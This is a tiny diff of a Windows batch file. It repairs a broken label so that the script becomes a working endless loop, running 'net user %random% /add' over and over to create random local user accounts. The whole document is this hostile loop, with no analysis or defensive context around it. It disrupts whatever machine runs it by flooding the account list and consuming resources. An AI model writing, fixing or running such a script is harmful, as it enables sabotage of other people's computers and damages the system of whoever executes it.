@@ -1,4 +1,4 @@
 @echo off
-:xnet
-user %random% /add
+:x
+net user %random% /add
 goto x
